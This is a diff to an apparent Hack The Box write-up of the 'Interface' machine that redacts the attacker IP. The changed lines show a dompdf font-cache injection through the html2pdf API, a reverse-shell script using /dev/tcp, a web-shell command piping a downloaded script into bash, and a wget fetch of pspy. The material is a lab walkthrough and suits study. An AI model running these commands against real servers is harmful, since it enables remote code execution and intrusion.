@@ -259,13 +259,13 @@ After that, we execute two servers, one at port 9000 and the other at 9001.
 And we run our exploit:
 
 ```bash
-❯ curl http://prd.m.rendering-api.interface.htb/api/html2pdf -d '{"html":"<link rel=stylesheet href=\"http://10.10.14.7:9001/exploit.css\">"}'
+❯ curl http://prd.m.rendering-api.interface.htb/api/html2pdf -d '{"html":"<link rel=stylesheet href=\"http://10.10.X.X:9001/exploit.css\">"}'
 ```
 
 After that we check for our md5sum, because it’s used to create the php file:
 
 ```bash
-❯ echo -ne "http://10.10.14.7:9001/exploit_font.php" | md5sum         
+❯ echo -ne "http://10.10.X.X:9001/exploit_font.php" | md5sum         
 05eee38048064022101b29bc7ca64806  -
 ```
 
@@ -288,7 +288,7 @@ Sooo, we have a foothold to execure a reverse shell to our machine:
 ───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────
    1   │ #!/bin/bash
    2   │ 
-   3   │ bash -i >&/dev/tcp/10.10.14.7/4444 0>&1
+   3   │ bash -i >&/dev/tcp/10.10.X.X/4444 0>&1
 ───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
@@ -302,7 +302,7 @@ listening on [any] 4444 ...
 ```
 
 ```bash
-❯ curl "http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_05eee38048064022101b29bc7ca64806.php?cmd=curl+10.10.14.7:9001/shell.sh|bash" --output -
+❯ curl "http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_05eee38048064022101b29bc7ca64806.php?cmd=curl+10.10.X.X:9001/shell.sh|bash" --output -
 ```
 
 And in our listener we get a shell as `www-data`.
@@ -310,7 +310,7 @@ And in our listener we get a shell as `www-data`.
 ```bash
 ❯ nc -lvnp 4444                             
 listening on [any] 4444 ...
-connect to [10.10.14.7] from (UNKNOWN) [10.10.11.200] 47828
+connect to [10.10.X.X] from (UNKNOWN) [10.10.11.200] 47828
 bash: cannot set terminal process group (1369): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$
@@ -373,9 +373,9 @@ www-data@interface:~/api/vendor/dompdf/dompdf/lib/fonts$
 After looking for credentials in files, we opt to upload an instance of `pspy`, a tool created to spy every command or process that executes code in memory.
 
 ```bash
-www-data@interface:/tmp$ wget 10.10.14.7:9001/pspy
---2025-06-27 16:21:44--  http://10.10.14.7:9001/pspy
-Connecting to 10.10.14.7:9001... connected.
+www-data@interface:/tmp$ wget 10.10.X.X:9001/pspy
+--2025-06-27 16:21:44--  http://10.10.X.X:9001/pspy
+Connecting to 10.10.X.X:9001... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 3104768 (3.0M) [application/octet-stream]
 Saving to: 'pspy'
